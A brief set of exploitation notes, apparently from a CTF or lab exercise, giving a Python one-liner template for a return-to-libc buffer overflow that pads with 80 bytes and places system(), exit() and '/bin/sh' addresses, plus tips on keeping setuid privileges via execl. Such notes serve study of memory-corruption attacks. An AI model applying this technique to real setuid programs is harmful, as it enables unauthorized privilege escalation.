```
python -c 'print "A" * 80 + "/bin/sh in env variable" + "DUM VARIABLE OR address of exit()" + "system address"
```

This will spwan the shell and exit since it drops the privilege. To get around you can use execl.

Note:
* for 0 to set uid, you can not wirte nullbyte so you have to figure out the other way.
